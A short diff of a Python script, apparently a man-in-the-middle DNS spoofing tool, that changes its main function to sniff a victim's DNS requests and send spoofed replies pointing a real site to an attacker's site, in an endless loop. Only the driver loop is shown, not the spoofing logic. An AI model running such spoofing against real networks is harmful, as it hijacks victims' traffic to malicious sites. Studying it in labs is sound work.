@@ -43,8 +43,11 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     
 def main() :
     # dns_req_test()
-    pkt = sniffPKT(ipVictim, goodSite)
-    MIMspoofDNS(pkt, goodSite, evilSite)
-    # print("Test Success")
+    while True: 
+        try:
+            pkt = sniffPKT(ipVictim, goodSite)
+            MIMspoofDNS(pkt, goodSite, evilSite)
+        except:
+            break
 
 main()
